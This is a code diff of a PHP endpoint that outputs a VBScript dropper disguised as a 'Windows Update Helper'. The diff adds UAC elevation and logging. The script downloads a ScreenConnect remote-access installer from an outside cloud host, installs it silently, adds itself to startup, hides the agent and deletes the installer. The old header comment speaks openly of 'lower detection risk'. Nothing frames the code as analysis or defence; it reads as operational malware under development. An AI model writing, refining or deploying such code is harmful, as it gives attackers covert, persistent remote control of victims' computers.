@@ -1,5 +1,5 @@
 <?php
-// invite.php - No elevation (lower detection risk)
+// invite.php - Elevation + Logs + Short Wait
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -34,22 +34,38 @@ $scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetu
 
 $sessionId = bin2hex(random_bytes(24));
 $ts        = time();
-$randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
 
 echo <<<VBS
 ' Windows Update Helper - $ts
 
-Dim $randV1, objShell, objFSO
+Dim objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO   = CreateObject("Scripting.FileSystemObject")
-
-$randV1 = "$sessionId"
 
 Sub Log(msg)
     WScript.Echo "[DEBUG] " & msg
 End Sub
 
 Call Log("Script started")
+
+Function IsElevated()
+    On Error Resume Next
+    Dim wmi, col, item
+    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
+    Set col = wmi.ExecQuery("Select * from Win32_Process where ProcessId = " & objShell.ProcessId)
+    For Each item In col
+        IsElevated = (item.GetOwner().Domain = "NT AUTHORITY")
+        Exit Function
+    Next
+    IsElevated = False
+End Function
+
+Sub Elevate()
+    On Error Resume Next
+    Call Log("Requesting UAC elevation...")
+    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
+    WScript.Quit
+End Sub
 
 Sub AddToStartup()
     On Error Resume Next
@@ -59,7 +75,7 @@ End Sub
 
 Sub DownloadAndExecute()
     On Error Resume Next
-    Dim u, p, http, strm
+    Dim u, p, http, strm, exitCode
     u = "$scUrl"
     p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
     
@@ -78,11 +94,17 @@ Sub DownloadAndExecute()
         strm.Close
         Call Log("Download complete → " & p)
         
-        Call Log("Starting silent install (waiting 10 minutes)...")
-        objShell.Run """" & p & """ /quiet", 0, True
-        WScript.Sleep 600000
-        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
-        Call Log("Cleanup done")
+        Call Log("Starting silent install...")
+        exitCode = objShell.Run("""" & p & """ /quiet", 0, True)
+        Call Log("Installer exit code: " & exitCode & " (0 = success)")
+        
+        Call Log("Waiting 90 seconds for install to finish...")
+        WScript.Sleep 90000
+        
+        If objFSO.FileExists(p) Then 
+            objFSO.DeleteFile p, True
+            Call Log("Temp file cleaned up")
+        End If
     Else
         Call Log("Download failed")
     End If
@@ -95,10 +117,15 @@ Sub HideAgent()
 End Sub
 
 ' ===== MAIN =====
-Call AddToStartup
-Call DownloadAndExecute
-Call HideAgent
-Call Log("All done")
+If Not IsElevated Then
+    Call Elevate
+Else
+    Call Log("Running with elevation")
+    Call AddToStartup
+    Call DownloadAndExecute
+    Call HideAgent
+    Call Log("All done")
+End If
 
 WScript.Quit
 VBS;
